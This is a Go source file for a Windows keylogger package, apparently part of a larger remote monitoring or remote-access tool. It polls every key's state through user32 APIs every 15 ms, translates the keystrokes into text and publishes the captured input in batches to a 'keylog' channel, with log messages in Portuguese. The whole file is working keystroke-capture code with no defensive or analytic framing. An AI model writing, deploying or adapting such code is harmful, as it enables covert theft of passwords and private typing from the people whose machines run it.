//go:build windows

package keylog

import (
	"context"
	"fmt"
	"log/slog"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

var (
	user32                = syscall.NewLazyDLL("user32.dll")
	procGetAsyncKeyState  = user32.NewProc("GetAsyncKeyState")
	procMapVirtualKeyW    = user32.NewProc("MapVirtualKeyW")
	procToUnicodeEx       = user32.NewProc("ToUnicodeEx")
	procGetKeyboardLayout = user32.NewProc("GetKeyboardLayout")
	procGetKeyboardState  = user32.NewProc("GetKeyboardState")
)

func getAsyncKeyState(vk int) int16 {
	ret, _, _ := procGetAsyncKeyState.Call(uintptr(vk))
	return int16(ret)
}

func getKeyboardState(state *[256]byte) bool {
	ret, _, _ := procGetKeyboardState.Call(uintptr(unsafe.Pointer(state)))
	return ret != 0
}

func vkToString(vk int) string {
	switch vk {
	case 0x08:
		return "[BS]"
	case 0x09:
		return "[TAB]"
	case 0x0D:
		return "[ENTER]"
	case 0x1B:
		return "[ESC]"
	case 0x20:
		return " "
	case 0x25:
		return "[LEFT]"
	case 0x26:
		return "[UP]"
	case 0x27:
		return "[RIGHT]"
	case 0x28:
		return "[DOWN]"
	case 0x2E:
		return "[DEL]"
	case 0x10, 0x11, 0x12: // shift, ctrl, alt
		return ""
	case 0xA0, 0xA1, 0xA2, 0xA3, 0xA4, 0xA5: // L/R shift, ctrl, alt
		return ""
	case 0x5B, 0x5C: // Win keys
		return ""
	}

	scanCode, _, _ := procMapVirtualKeyW.Call(uintptr(vk), 0)
	var kbState [256]byte
	getKeyboardState(&kbState)
	buf := make([]uint16, 8)
	hkl, _, _ := procGetKeyboardLayout.Call(0)
	ret, _, _ := procToUnicodeEx.Call(
		uintptr(vk),
		scanCode,
		uintptr(unsafe.Pointer(&kbState[0])),
		uintptr(unsafe.Pointer(&buf[0])),
		8, 0, hkl,
	)
	n := int(int32(ret))
	if n > 0 {
		return syscall.UTF16ToString(buf[:n])
	}
	if vk >= 0x70 && vk <= 0x87 {
		return fmt.Sprintf("[F%d]", vk-0x70+1)
	}
	return fmt.Sprintf("[0x%02X]", vk)
}

func captureLoop(ctx context.Context, id string, pub publisher, log *slog.Logger) {
	sid := currentSessionID()
	log.Info("keylog captureLoop iniciado", "session", id, "winSession", sid)
	_ = pub.Publish("keylog."+id, keyFrame{
		Keys: fmt.Sprintf("[captura iniciada na sessao Windows %d]", sid),
		Ts:   time.Now().UnixMilli(),
	})

	ticker := time.NewTicker(15 * time.Millisecond)
	defer ticker.Stop()

	var buf strings.Builder
	flush := time.NewTicker(500 * time.Millisecond)
	defer flush.Stop()

	for {
		select {
		case <-ctx.Done():
			if buf.Len() > 0 {
				_ = pub.Publish("keylog."+id, keyFrame{Keys: buf.String(), Ts: time.Now().UnixMilli()})
			}
			return
		case <-ticker.C:
			for vk := 0x01; vk <= 0xFE; vk++ {
				state := getAsyncKeyState(vk)
				if state&0x0001 != 0 {
					ch := vkToString(vk)
					if ch != "" {
						buf.WriteString(ch)
					}
				}
			}
		case <-flush.C:
			if buf.Len() > 0 {
				frame := keyFrame{Keys: buf.String(), Ts: time.Now().UnixMilli()}
				if err := pub.Publish("keylog."+id, frame); err != nil {
					log.Debug("keylog: falha ao publicar", "session", id, "erro", err)
				}
				buf.Reset()
			}
		}
	}
}

func currentSessionID() uint32 {
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	procID := kernel32.NewProc("WTSGetActiveConsoleSessionId")
	ret, _, _ := procID.Call()
	return uint32(ret)
}
